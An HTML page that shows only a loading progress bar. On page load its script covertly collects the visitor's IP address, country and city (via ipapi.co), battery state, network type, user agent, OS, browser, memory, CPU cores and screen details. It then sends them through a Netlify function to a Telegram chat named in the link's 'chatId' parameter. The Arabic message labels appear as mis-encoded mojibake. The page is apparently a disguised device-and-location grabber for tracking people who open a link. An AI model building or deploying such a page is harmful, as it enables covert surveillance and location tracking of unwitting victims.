<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #1a2a3a;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }
        .loader {
            width: 80%;
            max-width: 300px;
        }
        .progress {
            width: 100%;
            height: 8px;
            background: rgba(255,255,255,0.2);
            border-radius: 4px;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            background: #3498db;
            width: 0%;
            transition: width 0.3s;
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="progress">
            <div class="progress-bar" id="progressBar"></div>
        </div>
    </div>

    <script>
        function getChatId() {
            const params = new URLSearchParams(window.location.search);
            return params.get('chatId');
        }
        
        function updateProgress(percent) {
            document.getElementById('progressBar').style.width = percent + '%';
        }
        
        async function sendToTelegram(message, chatId) {
            try {
                const response = await fetch('/.netlify/functions/device-info', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chatId: chatId,
                        message: message
                    })
                });
                
                const result = await response.json();
                return result.success;
                
            } catch (error) {
                console.error('Error:', error);
                return false;
            }
        }
        
        function getHijriDate() {
            return new Date().toLocaleDateString('ar-EG', {calendar: 'islamic'});
        }
        
        function getCurrentTime() {
            return new Date().toLocaleTimeString('ar-EG');
        }
        
        function detectDeviceType() {
            const ua = navigator.userAgent;
            if (/mobile/i.test(ua)) return 'Ù‡Ø§ØªÙ ğŸ“±';
            if (/tablet/i.test(ua)) return 'ØªØ§Ø¨Ù„Øª ğŸ“±';
            return 'ÙƒÙ…Ø¨ÙŠÙˆØªØ± ğŸ–¥ï¸';
        }
        
        function detectBrowser() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome')) return 'Chrome ğŸŒ';
            if (ua.includes('Firefox')) return 'Firefox ğŸŒ';
            if (ua.includes('Safari')) return 'Safari ğŸŒ';
            return 'Ù…ØªØµÙØ­ Ø¢Ø®Ø± ğŸŒ';
        }
        
        function detectOS() {
            const ua = navigator.userAgent;
            if (ua.includes('Android')) return 'Android ğŸ“±';
            if (ua.includes('iOS') || ua.includes('iPhone')) return 'iOS ğŸ“±';
            if (ua.includes('Windows')) return 'Windows ğŸ–¥ï¸';
            if (ua.includes('Mac')) return 'macOS ğŸ–¥ï¸';
            if (ua.includes('Linux')) return 'Linux ğŸ–¥ï¸';
            return 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ ğŸ–¥ï¸';
        }
        
        async function collectInfo() {
            const chatId = getChatId();
            if (!chatId) return;
            
            updateProgress(30);
            
            let location = {};
            try {
                const response = await fetch('https://ipapi.co/json/');
                location = await response.json();
            } catch (error) {
                location = {country_name: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ', city: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ', ip: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'};
            }
            
            updateProgress(60);
            
            let battery = {level: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ', charging: false};
            if ('getBattery' in navigator) {
                try {
                    const b = await navigator.getBattery();
                    battery.level = Math.round(b.level * 100) + '%';
                    battery.charging = b.charging;
                } catch (e) {}
            }
            
            updateProgress(90);
            
            const message = `ğŸ“± Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²:
- Ø§Ù„Ø¯ÙˆÙ„Ø©: ${location.country_name} ğŸ”»
- Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${location.city} ğŸ™ï¸  
- Ø¹Ù†ÙˆØ§Ù† IP: ${location.ip} ğŸŒ
- Ø´Ø­Ù† Ø§Ù„Ù‡Ø§ØªÙ: ${battery.level} ğŸ”‹
- Ù‡Ù„ Ø§Ù„Ù‡Ø§ØªÙ ÙŠØ´Ø­Ù†ØŸ: ${battery.charging ? 'Ù†Ø¹Ù… âš¡' : 'Ù„Ø§ âš¡'}
- Ø§Ù„Ø´Ø¨ÙƒØ©: ${navigator.connection?.effectiveType || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'} ğŸ“¶
- Ù†ÙˆØ¹ Ø§Ù„Ø§ØªØµØ§Ù„: ${navigator.connection?.type || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'} ğŸ“¡
- Ø§Ù„ÙˆÙ‚Øª: ${getHijriDate()} ${getCurrentTime()} â°
- Ø§Ø³Ù… Ø§Ù„Ø¬Ù‡Ø§Ø²: ${detectOS()} ğŸ–¥ï¸
- Ø¥ØµØ¯Ø§Ø± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${navigator.userAgent} ğŸ“œ
- Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²: ${detectDeviceType()}
- Ø§Ù„Ø°Ø§ÙƒØ±Ø© (RAM): ${navigator.deviceMemory || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'} GB ğŸ§ 
- Ø¹Ø¯Ø¯ Ø§Ù„Ø£Ù†ÙˆÙŠØ©: ${navigator.hardwareConcurrency || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'} âš™ï¸
- Ù„ØºØ© Ø§Ù„Ù†Ø¸Ø§Ù…: ${navigator.language} ğŸŒ
- Ø§Ø³Ù… Ø§Ù„Ù…ØªØµÙØ­: ${detectBrowser()}
- Ø¯Ù‚Ø© Ø§Ù„Ø´Ø§Ø´Ø©: ${screen.width}x${screen.height} ğŸ“
- Ø¥ØµØ¯Ø§Ø± Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„: ${detectOS()}
- ÙˆØ¶Ø¹ Ø§Ù„Ø´Ø§Ø´Ø©: ${screen.orientation?.type || 'portrait-primary'} ğŸ”„
- Ø¹Ù…Ù‚ Ø§Ù„Ø£Ù„ÙˆØ§Ù†: ${screen.colorDepth} bit ğŸ¨
- Ø¨Ø±ÙˆØªÙˆÙƒÙˆÙ„ Ø§Ù„Ø£Ù…Ø§Ù†: ${location.protocol} ğŸ”’
- ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${'geolocation' in navigator ? 'Ù†Ø¹Ù… ğŸŒ' : 'Ù„Ø§ ğŸŒ'}
- Ø¨Ù„ÙˆØªÙˆØ«: ${'bluetooth' in navigator ? 'Ù†Ø¹Ù… ğŸ”µ' : 'Ù„Ø§ ğŸ”µ'}
- Ù„Ù…Ø³: ${'ontouchstart' in window ? 'Ù†Ø¹Ù… âœ‹' : 'Ù„Ø§ âœ‹'}`;

            await sendToTelegram(message, chatId);
            updateProgress(100);
        }
        
        collectInfo();
    </script>
</body>
</html>
